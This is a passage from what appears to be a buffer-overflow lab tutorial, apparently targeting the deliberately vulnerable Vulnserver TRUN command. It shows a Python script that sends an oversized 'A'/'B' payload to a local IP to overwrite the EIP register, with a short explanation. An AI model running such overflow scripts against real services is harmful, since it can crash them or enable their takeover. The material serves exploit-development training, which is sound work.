We are going to be using a script to overwrite the `EIP` 

```python
#!/usr/bin/python
 
import sys, socket

# replace 2003 with the offset you got 
shellcode = "A" * 2003 + "B" * 4

try: 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.0.106',9999))
        s.send(('TRUN /.:/' + shellcode))
        s.close()

except:
        print ("Error Connecting to the server")
        sys.exit()
```

- Save the script and grant executable permissions, then run it

![](https://i.imgur.com/frEb7Bg.gif)

What we did here is overwrite the `EIP` , the line `shellcode = "A" * 2003 + "B" * 4` sends A, 2003 times then `"B" * 4` will set the `EIP` to 42424242 since B is in position 2

![](https://i.imgur.com/1tv0WSU.png)
